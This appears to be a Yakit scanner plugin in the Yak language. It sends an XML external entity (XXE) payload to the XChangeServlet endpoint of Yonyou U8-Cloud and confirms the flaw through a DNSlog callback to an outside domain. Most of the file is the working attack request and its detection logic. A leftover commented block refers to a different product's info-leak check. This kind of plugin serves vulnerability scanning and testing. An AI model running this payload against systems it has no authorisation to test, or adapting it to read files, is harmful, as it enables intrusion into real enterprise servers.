# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    rand_Payload=str.RandStr(10)
    server,token,err = risk.NewDNSLogDomain()
    die(err)
    yakit.Info("dnslog server addr: %v ",server)
    yakit.Info("dnslog server check token: %v", token)
    reverseURL = "http://" + rand_Payload+"."+server
    packet1 = `POST /service/XChangeServlet HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Content-Length: 129
Connection: close
Content-Type: text/xml
Accept-Encoding: gzip

<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "{{params(server)}}">]><r><a>&xxe;</a ></r>`





    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr,"server":reverseURL}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    hand,body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    time.sleep(40)
    r0_flag = false
    detail, _ := risk.CheckDNSLogByToken(token)

    if len(detail) > 0{
        r0_flag = true
    }
    die(err)
    if r0_flag{
        yakit.Info("%v found用友U8-Cloud XChangServlet 接口xxe", addr)
        risk.NewRisk(
        addr,
        risk.title("用友U8-Cloud XChangServlet 接口xxe"),
        risk.severity("high"),
        risk.titleVerbose("用友U8-Cloud XChangServlet 接口xxe"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    //  risk.NewRisk(
    //         addr,risk.title("奇安信天擎终端安全管理系统API信息泄露"),
    //         risk.severity("low"),
    //         risk.titleVerbose("奇安信天擎终端安全管理系统API信息泄露存在"),
    //         risk.type("信息泄露[奇安信天擎]"),
    //         risk.request(string(req)),
    //         risk.response(string(rsp)),
    //     )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
